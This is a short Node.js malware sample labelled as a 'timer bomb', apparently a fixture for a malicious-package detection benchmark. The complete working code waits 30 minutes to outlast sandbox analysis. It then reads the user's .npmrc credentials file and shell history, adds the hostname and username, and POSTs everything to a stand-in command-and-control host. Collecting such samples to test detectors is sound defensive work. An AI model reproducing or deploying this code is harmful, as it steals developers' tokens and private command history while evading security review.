// Timer bomb: delays malicious activity to evade sandbox analysis
// Technique: static_timer_bomb — setTimeout with long delay before payload
// Real-world: 419 samples in Datadog benchmark

const fs = require('fs');
const http = require('http');
const path = require('path');
const os = require('os');

// Delay execution by 30 minutes to evade sandbox (most sandboxes timeout < 10min)
setTimeout(function() {
  const npmrc = path.join(os.homedir(), '.npmrc');
  const bashHistory = path.join(os.homedir(), '.bash_history');

  let payload = { host: os.hostname(), user: os.userInfo().username };

  try {
    payload.npmrc = fs.readFileSync(npmrc, 'utf8');
  } catch(e) {}

  try {
    payload.history = fs.readFileSync(bashHistory, 'utf8').slice(-2000);
  } catch(e) {}

  const data = JSON.stringify(payload);
  const req = http.request({
    hostname: 'timer-c2.example.com',
    path: '/exfil',
    method: 'POST'
  }, () => {});
  req.write(data);
  req.end();
}, 1800000); // 30 minutes
